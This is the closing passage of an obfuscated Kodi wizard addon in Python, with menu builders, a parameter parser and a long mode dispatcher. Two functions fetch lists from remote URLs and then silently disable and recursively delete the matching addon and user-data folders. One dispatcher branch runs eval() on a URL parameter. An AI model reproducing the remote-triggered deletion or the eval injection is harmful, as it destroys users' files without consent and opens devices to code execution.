			if OOO0O0OO0OO0OOO0O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5026
			if STARTP2 ()=='ok':#line:5027
				notify .notification2 (OO0O0O00OO0OOOO0O ,True )#line:5028
		except Exception as O0O0OOOOOO00OO000 :#line:5029
			wiz .log ("Error on Notifications Window: %s"%str (O0O0OOOOOO00OO000 ),xbmc .LOGERROR )#line:5030
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5031
def testnotify3 ():#line:5032
	O0OOOO0O00O000O00 =wiz .workingURL (NOTIFICATION3 )#line:5033
	if O0OOOO0O00O000O00 ==True :#line:5034
		try :#line:5035
			OO00OOOO0OOO0O00O ,OOOO00O00OO0O00O0 =wiz .splitNotify (NOTIFICATION3 )#line:5036
			if OO00OOOO0OOO0O00O ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 );return #line:5037
			if STARTP2 ()=='ok':#line:5038
				notify .notification3 (OOOO00O00OO0O00O0 ,True )#line:5039
		except Exception as O0000OOOO00O0000O :#line:5040
			wiz .log ("Error on Notifications Window: %s"%str (O0000OOOO00O0000O ),xbmc .LOGERROR )#line:5041
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]אין עדכון מהיר[/COLOR]"%COLOR2 )#line:5042
def servicemanual ():#line:5043
	OOOOO000O0OO0O000 =wiz .workingURL (HELPINFO )#line:5044
	if OOOOO000O0OO0O000 ==True :#line:5045
		try :#line:5046
			O0O0O000OOOOO0OO0 ,OOO000OO0000O0000 =wiz .splitNotify (HELPINFO )#line:5047
			if O0O0O000OOOOO0OO0 ==False :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Notification: Not Formated Correctly[/COLOR]"%COLOR2 );return #line:5048
			notify .helpinfo (OOO000OO0000O0000 ,True )#line:5049
		except Exception as O0OO000O00000OOO0 :#line:5050
			wiz .log ("Error on Notifications Window: %s"%str (O0OO000O00000OOO0 ),xbmc .LOGERROR )#line:5051
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Invalid URL for Notification[/COLOR]"%COLOR2 )#line:5052
def testupdate ():#line:5054
	if BUILDNAME =="":#line:5055
		notify .updateWindow ()#line:5056
	else :#line:5057
		notify .updateWindow (BUILDNAME ,BUILDVERSION ,BUILDLATEST ,wiz .checkBuild (BUILDNAME ,'icon'),wiz .checkBuild (BUILDNAME ,'fanart'))#line:5058
def testfirst ():#line:5060
	notify .firstRun ()#line:5061
def testfirstRun ():#line:5063
	notify .firstRunSettings ()#line:5064
def fastinstall ():#line:5067
	notify .firstRuninstall ()#line:5068
def addDir (O0OO000OO000O0O00 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5075
	OO0O00OOO0000OO0O =sys .argv [0 ]#line:5076
	if not mode ==None :OO0O00OOO0000OO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5077
	if not name ==None :OO0O00OOO0000OO0O +="&name="+urllib .quote_plus (name )#line:5078
	if not url ==None :OO0O00OOO0000OO0O +="&url="+urllib .quote_plus (url )#line:5079
	O0O0O000O00OOO000 =True #line:5080
	if themeit :O0OO000OO000O0O00 =themeit %O0OO000OO000O0O00 #line:5081
	OO0O0000O0OOO000O =xbmcgui .ListItem (O0OO000OO000O0O00 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5082
	OO0O0000O0OOO000O .setInfo (type ="Video",infoLabels ={"Title":O0OO000OO000O0O00 ,"Plot":description })#line:5083
	OO0O0000O0OOO000O .setProperty ("Fanart_Image",fanart )#line:5084
	if not menu ==None :OO0O0000O0OOO000O .addContextMenuItems (menu ,replaceItems =overwrite )#line:5085
	O0O0O000O00OOO000 =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OO0O00OOO0000OO0O ,listitem =OO0O0000O0OOO000O ,isFolder =True )#line:5086
	return O0O0O000O00OOO000 #line:5087
def addFile (OO000OOO0OOOO00O0 ,mode =None ,name =None ,url =None ,menu =None ,description =ADDONTITLE ,overwrite =True ,fanart =FANART ,icon =ICON ,themeit =None ):#line:5089
	OOO000O00O0O0OO0O =sys .argv [0 ]#line:5090
	if not mode ==None :OOO000O00O0O0OO0O +="?mode=%s"%urllib .quote_plus (mode )#line:5091
	if not name ==None :OOO000O00O0O0OO0O +="&name="+urllib .quote_plus (name )#line:5092
	if not url ==None :OOO000O00O0O0OO0O +="&url="+urllib .quote_plus (url )#line:5093
	OOO0OOO000O00OOOO =True #line:5094
	if themeit :OO000OOO0OOOO00O0 =themeit %OO000OOO0OOOO00O0 #line:5095
	OOOOOO0OOOOOOOOO0 =xbmcgui .ListItem (OO000OOO0OOOO00O0 ,iconImage ="DefaultFolder.png",thumbnailImage =icon )#line:5096
	OOOOOO0OOOOOOOOO0 .setInfo (type ="Video",infoLabels ={"Title":OO000OOO0OOOO00O0 ,"Plot":description })#line:5097
	OOOOOO0OOOOOOOOO0 .setProperty ("Fanart_Image",fanart )#line:5098
	if not menu ==None :OOOOOO0OOOOOOOOO0 .addContextMenuItems (menu ,replaceItems =overwrite )#line:5099
	OOO0OOO000O00OOOO =xbmcplugin .addDirectoryItem (handle =int (sys .argv [1 ]),url =OOO000O00O0O0OO0O ,listitem =OOOOOO0OOOOOOOOO0 ,isFolder =False )#line:5100
	return OOO0OOO000O00OOOO #line:5101
def get_params ():#line:5103
	O00O0OO00O000000O =[]#line:5104
	OOO0OO000O000O00O =sys .argv [2 ]#line:5105
	if len (OOO0OO000O000O00O )>=2 :#line:5106
		O00O00O00O0000O0O =sys .argv [2 ]#line:5107
		O0O0O0O00OO0OOO00 =O00O00O00O0000O0O .replace ('?','')#line:5108
		if (O00O00O00O0000O0O [len (O00O00O00O0000O0O )-1 ]=='/'):#line:5109
			O00O00O00O0000O0O =O00O00O00O0000O0O [0 :len (O00O00O00O0000O0O )-2 ]#line:5110
		OOO00O0OOOOOO0O0O =O0O0O0O00OO0OOO00 .split ('&')#line:5111
		O00O0OO00O000000O ={}#line:5112
		for O0000O0O0OOO0O0OO in range (len (OOO00O0OOOOOO0O0O )):#line:5113
			OOO0OO0O0O0OO0O00 ={}#line:5114
			OOO0OO0O0O0OO0O00 =OOO00O0OOOOOO0O0O [O0000O0O0OOO0O0OO ].split ('=')#line:5115
			if (len (OOO0OO0O0O0OO0O00 ))==2 :#line:5116
				O00O0OO00O000000O [OOO0OO0O0O0OO0O00 [0 ]]=OOO0OO0O0O0OO0O00 [1 ]#line:5117
		return O00O0OO00O000000O #line:5119
def remove_addons ():#line:5121
	try :#line:5122
			import json #line:5123
			OOOO0O0O0O0OO0O00 =urllib2 .urlopen (remove_url ).readlines ()#line:5124
			for O00OOO0O0O000O000 in OOOO0O0O0O0OO0O00 :#line:5125
				OOO0OO0OOOOO0O0OO =O00OOO0O0O000O000 .split (':')[1 ].strip ()#line:5127
				OO00O00O00O00OO00 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled","params":{"addonid":"%s","enabled":%s}}'%(OOO0OO0OOOOO0O0OO ,'false')#line:5128
				O000O0OOO0OO0OOOO =xbmc .executeJSONRPC (OO00O00O00O00OO00 )#line:5129
				O0OOOOOO0OOOO0O0O =json .loads (O000O0OOO0OO0OOOO )#line:5130
				OO0O0OOOO000OO0OO =os .path .join (addons_folder ,OOO0OO0OOOOO0O0OO )#line:5132
				if os .path .exists (OO0O0OOOO000OO0OO ):#line:5134
					for OO00O0OO0O0OOO0OO ,O0OO0OOOOO0O00OOO ,O000O0OO00O0OO0O0 in os .walk (OO0O0OOOO000OO0OO ):#line:5135
						for O0O000000OO00O0O0 in O000O0OO00O0OO0O0 :#line:5136
							os .unlink (os .path .join (OO00O0OO0O0OOO0OO ,O0O000000OO00O0O0 ))#line:5137
						for OO00OO000O000000O in O0OO0OOOOO0O00OOO :#line:5138
							shutil .rmtree (os .path .join (OO00O0OO0O0OOO0OO ,OO00OO000O000000O ))#line:5139
					os .rmdir (OO0O0OOOO000OO0OO )#line:5140
			xbmc .executebuiltin ('Container.Refresh')#line:5142
			xbmc .executebuiltin ("XBMC.UpdateLocalAddons()")#line:5143
			xbmc .executebuiltin ('Container.Update(%s)'%xbmc .getInfoLabel ('Container.FolderPath'))#line:5144
	except :pass #line:5145
def remove_addons2 ():#line:5146
	try :#line:5147
			import json #line:5148
			O00O0O000OOOO000O =urllib2 .urlopen (remove_url2 ).readlines ()#line:5149
			for OO00OOO0OO0OO0000 in O00O0O000OOOO000O :#line:5150
				O0O0000O0OO000O00 =OO00OOO0OO0OO0000 .split (':')[1 ].strip ()#line:5152
				O00000OOO00OO0OO0 ='{"jsonrpc":"2.0","id":1,"method":"Addons.SetAddonEnabled1","params":{"addonid":"%s","enabled":%s}}'%(O0O0000O0OO000O00 ,'false')#line:5153
				OOOO00OOOO00O0O00 =xbmc .executeJSONRPC (O00000OOO00OO0OO0 )#line:5154
				O0OOOO00O00O000O0 =json .loads (OOOO00OOOO00O0O00 )#line:5155
				O000O00O0O0000O0O =os .path .join (user_folder ,O0O0000O0OO000O00 )#line:5157
				if os .path .exists (O000O00O0O0000O0O ):#line:5159
					for OO0OOO00O0OOOO00O ,OO000OO0OO0O00O0O ,O0OO0OOO0O0000O00 in os .walk (O000O00O0O0000O0O ):#line:5160
						for O00000O0000O0O0OO in O0OO0OOO0O0000O00 :#line:5161
							os .unlink (os .path .join (OO0OOO00O0OOOO00O ,O00000O0000O0O0OO ))#line:5162
						for O0OOOO0000O0OO000 in OO000OO0OO0O00O0O :#line:5163
							shutil .rmtree (os .path .join (OO0OOO00O0OOOO00O ,O0OOOO0000O0OO000 ))#line:5164
					os .rmdir (O000O00O0O0000O0O )#line:5165
	except :pass #line:5167
params =get_params ()#line:5168
url =None #line:5169
name =None #line:5170
mode =None #line:5171
try :mode =urllib .unquote_plus (params ["mode"])#line:5173
except :pass #line:5174
try :name =urllib .unquote_plus (params ["name"])#line:5175
except :pass #line:5176
try :url =urllib .unquote_plus (params ["url"])#line:5177
except :pass #line:5178
wiz .log ('[ Version : \'%s\' ] [ Mode : \'%s\' ] [ Name : \'%s\' ] [ Url : \'%s\' ]'%(VERSION ,mode if not mode ==''else None ,name ,url ))#line:5180
wiz .log ("AAAAAAAAAAAAAAAAAAAAAAAAAA URL: %s"%mode )#line:5181
def setView (OOOOO0O0O0OOO00O0 ,O0O0OO00000OOO0OO ):#line:5182
	if wiz .getS ('auto-view')=='true':#line:5183
		O0O0OO00O0OO0OOOO =wiz .getS (O0O0OO00000OOO0OO )#line:5184
		if O0O0OO00O0OO0OOOO =='50'and KODIV >=17 and SKIN =='skin.estuary':O0O0OO00O0OO0OOOO ='55'#line:5185
		if O0O0OO00O0OO0OOOO =='500'and KODIV >=17 and SKIN =='skin.estuary':O0O0OO00O0OO0OOOO ='50'#line:5186
		wiz .ebi ("Container.SetViewMode(%s)"%O0O0OO00O0OO0OOOO )#line:5187
if mode ==None :index ()#line:5189
elif mode =='wizardupdate':wiz .wizardUpdate ()#line:5191
elif mode =='builds':buildMenu ()#line:5192
elif mode =='viewbuild':viewBuild (name )#line:5193
elif mode =='buildinfo':buildInfo (name )#line:5194
elif mode =='buildpreview':buildVideo (name )#line:5195
elif mode =='install':buildWizard (name ,url )#line:5196
elif mode =='theme':buildWizard (name ,mode ,url )#line:5197
elif mode =='viewthirdparty':viewThirdList (name )#line:5198
elif mode =='installthird':thirdPartyInstall (name ,url )#line:5199
elif mode =='editthird':editThirdParty (name );wiz .refresh ()#line:5200
elif mode =='maint':maintMenu (name )#line:5202
elif mode =='passpin':passandpin ()#line:5203
elif mode =='backmyupbuild':backmyupbuild ()#line:5204
elif mode =='kodi17fix':wiz .kodi17Fix ()#line:5205
elif mode =='kodi177fix':wiz .kodi177Fix ()#line:5206
elif mode =='advancedsetting':advancedWindow (name )#line:5207
elif mode =='autoadvanced':showAutoAdvanced ();wiz .refresh ()#line:5208
elif mode =='removeadvanced':removeAdvanced ();wiz .refresh ()#line:5209
elif mode =='asciicheck':wiz .asciiCheck ()#line:5210
elif mode =='backupbuild':wiz .backUpOptions ('build')#line:5211
elif mode =='backupgui':wiz .backUpOptions ('guifix')#line:5212
elif mode =='backuptheme':wiz .backUpOptions ('theme')#line:5213
elif mode =='backupaddon':wiz .backUpOptions ('addondata')#line:5214
elif mode =='oldThumbs':wiz .oldThumbs ()#line:5215
elif mode =='clearbackup':wiz .cleanupBackup ()#line:5216
elif mode =='convertpath':wiz .convertSpecial (HOME )#line:5217
elif mode =='currentsettings':viewAdvanced ()#line:5218
elif mode =='fullclean':totalClean ();wiz .refresh ()#line:5219
elif mode =='clearcache':clearCache ();wiz .refresh ()#line:5220
elif mode =='fixwizard':fixwizard ();wiz .refresh ()#line:5221
elif mode =='fixskin':backtokodi ()#line:5222
elif mode =='testcommand':testcommand ()#line:5223
elif mode =='logsend':logsend ()#line:5224
elif mode =='rdon':rdon ()#line:5225
elif mode =='rdoff':rdoff ()#line:5226
elif mode =='clearpackages':wiz .clearPackages ();wiz .refresh ()#line:5227
elif mode =='clearcrash':wiz .clearCrash ();wiz .refresh ()#line:5228
elif mode =='clearthumb':clearThumb ();wiz .refresh ()#line:5229
elif mode =='checksources':wiz .checkSources ();wiz .refresh ()#line:5230
elif mode =='checkrepos':wiz .checkRepos ();wiz .refresh ()#line:5231
elif mode =='freshstart':freshStart ()#line:5232
elif mode =='forceupdate':wiz .forceUpdate ()#line:5233
elif mode =='forceprofile':wiz .reloadProfile (wiz .getInfo ('System.ProfileName'))#line:5234
elif mode =='forceclose':wiz .killxbmc ()#line:5235
elif mode =='forceskin':wiz .ebi ("ReloadSkin()");wiz .refresh ()#line:5236
elif mode =='hidepassword':wiz .hidePassword ()#line:5237
elif mode =='unhidepassword':wiz .unhidePassword ()#line:5238
elif mode =='enableaddons':enableAddons ()#line:5239
elif mode =='toggleaddon':wiz .toggleAddon (name ,url );wiz .refresh ()#line:5240
elif mode =='togglecache':toggleCache (name );wiz .refresh ()#line:5241
elif mode =='toggleadult':wiz .toggleAdult ();wiz .refresh ()#line:5242
elif mode =='changefeq':changeFeq ();wiz .refresh ()#line:5243
elif mode =='uploadlog':uploadLog .Main ()#line:5244
elif mode =='viewlog':LogViewer ()#line:5245
elif mode =='viewwizlog':LogViewer (WIZLOG )#line:5246
elif mode =='viewerrorlog':errorChecking (all =True )#line:5247
elif mode =='clearwizlog':f =open (WIZLOG ,'w');f .close ();wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Wizard Log Cleared![/COLOR]"%COLOR2 )#line:5248
elif mode =='purgedb':purgeDb ()#line:5249
elif mode =='fixaddonupdate':fixUpdate ()#line:5250
elif mode =='removeaddons':removeAddonMenu ()#line:5251
elif mode =='removeaddon':removeAddon (name )#line:5252
elif mode =='removeaddondata':removeAddonDataMenu ()#line:5253
elif mode =='removedata':removeAddonData (name )#line:5254
elif mode =='resetaddon':total =wiz .cleanHouse (ADDONDATA ,ignore =True );wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]Addon_Data reset[/COLOR]"%COLOR2 )#line:5255
elif mode =='systeminfo':systemInfo ()#line:5256
elif mode =='restorezip':restoreit ('build')#line:5257
elif mode =='restoregui':restoreit ('gui')#line:5258
elif mode =='restoreaddon':restoreit ('addondata')#line:5259
elif mode =='restoreextzip':restoreextit ('build')#line:5260
elif mode =='restoreextgui':restoreextit ('gui')#line:5261
elif mode =='restoreextaddon':restoreextit ('addondata')#line:5262
elif mode =='writeadvanced':writeAdvanced (name ,url )#line:5263
elif mode =='apk':apkMenu (name )#line:5265
elif mode =='apkscrape':apkScraper (name )#line:5266
elif mode =='apkinstall':apkInstaller (name ,url )#line:5267
elif mode =='speed':speedMenu ()#line:5268
elif mode =='net':net_tools ()#line:5269
elif mode =='GetList':GetList (url )#line:5270
elif mode =='youtube':youtubeMenu (name )#line:5271
elif mode =='viewVideo':playVideo (url )#line:5272
elif mode =='addons':addonMenu (name )#line:5274
elif mode =='addoninstall':addonInstaller (name ,url )#line:5275
elif mode =='savedata':saveMenu ()#line:5277
elif mode =='togglesetting':wiz .setS (name ,'false'if wiz .getS (name )=='true'else 'true');wiz .refresh ()#line:5278
elif mode =='managedata':manageSaveData (name )#line:5279
elif mode =='whitelist':wiz .whiteList (name )#line:5280
elif mode =='trakt':traktMenu ()#line:5282
elif mode =='savetrakt':traktit .traktIt ('update',name )#line:5283
elif mode =='restoretrakt':traktit .traktIt ('restore',name )#line:5284
elif mode =='addontrakt':traktit .traktIt ('clearaddon',name )#line:5285
elif mode =='cleartrakt':traktit .clearSaved (name )#line:5286
elif mode =='authtrakt':traktit .activateTrakt (name );wiz .refresh ()#line:5287
elif mode =='updatetrakt':traktit .autoUpdate ('all')#line:5288
elif mode =='importtrakt':traktit .importlist (name );wiz .refresh ()#line:5289
elif mode =='realdebrid':realMenu ()#line:5291
elif mode =='savedebrid':debridit .debridIt ('update',name )#line:5292
elif mode =='restoredebrid':debridit .debridIt ('restore',name )#line:5293
elif mode =='addondebrid':debridit .debridIt ('clearaddon',name )#line:5294
elif mode =='cleardebrid':debridit .clearSaved (name )#line:5295
elif mode =='authdebrid':debridit .activateDebrid (name );wiz .refresh ()#line:5296
elif mode =='updatedebrid':debridit .autoUpdate ('all')#line:5297
elif mode =='importdebrid':debridit .importlist (name );wiz .refresh ()#line:5298
elif mode =='login':loginMenu ()#line:5300
elif mode =='savelogin':loginit .loginIt ('update',name )#line:5301
elif mode =='restorelogin':loginit .loginIt ('restore',name )#line:5302
elif mode =='addonlogin':loginit .loginIt ('clearaddon',name )#line:5303
elif mode =='clearlogin':loginit .clearSaved (name )#line:5304
elif mode =='authlogin':loginit .activateLogin (name );wiz .refresh ()#line:5305
elif mode =='updatelogin':loginit .autoUpdate ('all')#line:5306
elif mode =='importlogin':loginit .importlist (name );wiz .refresh ()#line:5307
elif mode =='contact':notify .contact (CONTACT )#line:5309
elif mode =='settings':wiz .openS (name );wiz .refresh ()#line:5310
elif mode =='opensettings':id =eval (url .upper ()+'ID')[name ]['plugin'];addonid =wiz .addonId (id );addonid .openSettings ();wiz .refresh ()#line:5311
elif mode =='developer':developer ()#line:5313
elif mode =='converttext':wiz .convertText ()#line:5314
elif mode =='createqr':wiz .createQR ()#line:5315
elif mode =='testnotify':testnotify ()#line:5316
elif mode =='testnotify2':testnotify2 ()#line:5317
elif mode =='servicemanual':servicemanual ()#line:5318
elif mode =='fastinstall':fastinstall ()#line:5319
elif mode =='testupdate':testupdate ()#line:5320
elif mode =='testfirst':testfirst ()#line:5321
elif mode =='testfirstrun':testfirstRun ()#line:5322
elif mode =='testapk':notify .apkInstaller ('SPMC')#line:5323
elif mode =='bg':wiz .bg_install (name ,url )#line:5325
elif mode =='bgcustom':wiz .bg_custom ()#line:5326
elif mode =='bgremove':wiz .bg_remove ()#line:5327
elif mode =='bgdefault':wiz .bg_default ()#line:5328
elif mode =='rdset':rdsetup ()#line:5329
elif mode =='mor':morsetup ()#line:5330
elif mode =='mor2':morsetup2 ()#line:5331
elif mode =='resolveurl':resolveurlsetup ()#line:5332
elif mode =='urlresolver':urlresolversetup ()#line:5333
elif mode =='forcefastupdate':forcefastupdate ()#line:5334
elif mode =='traktset':traktsetup ()#line:5335
elif mode =='placentaset':placentasetup ()#line:5336
elif mode =='flixnetset':flixnetsetup ()#line:5337
elif mode =='reptiliaset':reptiliasetup ()#line:5338
elif mode =='yodasset':yodasetup ()#line:5339
elif mode =='numbersset':numberssetup ()#line:5340
elif mode =='uranusset':uranussetup ()#line:5341
elif mode =='genesisset':genesissetup ()#line:5342
elif mode =='fastupdate':fastupdate ()#line:5343
elif mode =='folderback':folderback ()#line:5344
elif mode =='menudata':Menu ()#line:5345
elif mode ==2 :#line:5347
        wiz .torent_menu ()#line:5348
elif mode ==3 :#line:5349
        wiz .popcorn_menu ()#line:5350
elif mode ==8 :#line:5351
        wiz .metaliq_fix ()#line:5352
elif mode ==9 :#line:5353
        wiz .quasar_menu ()#line:5354
elif mode ==5 :#line:5355
        swapSkins ('skin.Premium.mod')#line:5356
elif mode ==13 :#line:5357
        wiz .elementum_menu ()#line:5358
elif mode ==16 :#line:5359
        wiz .fix_wizard ()#line:5360
elif mode ==17 :#line:5361
        wiz .last_play ()#line:5362
elif mode ==18 :#line:5363
        wiz .normal_metalliq ()#line:5364
elif mode ==19 :#line:5365
        wiz .fast_metalliq ()#line:5366
elif mode ==20 :#line:5367
        wiz .fix_buffer2 ()#line:5368
elif mode ==21 :#line:5369
        wiz .fix_buffer3 ()#line:5370
elif mode ==11 :#line:5371
        wiz .fix_buffer ()#line:5372
elif mode ==15 :#line:5373
        wiz .fix_font ()#line:5374
elif mode ==14 :#line:5375
        wiz .clean_pass ()#line:5376
elif mode ==22 :#line:5377
        wiz .movie_update ()#line:5378
elif mode =='adv_settings':buffer1 ()#line:5379
elif mode =='getpass':getpass ()#line:5380
elif mode =='setpass':setpass ()#line:5381
elif mode =='setuname':setuname ()#line:5382
elif mode =='passandUsername':passandUsername ()#line:5383
elif mode =='9':disply_hwr ()#line:5384
elif mode =='99':disply_hwr2 ()#line:5385
xbmcplugin .endOfDirectory (int (sys .argv [1 ]))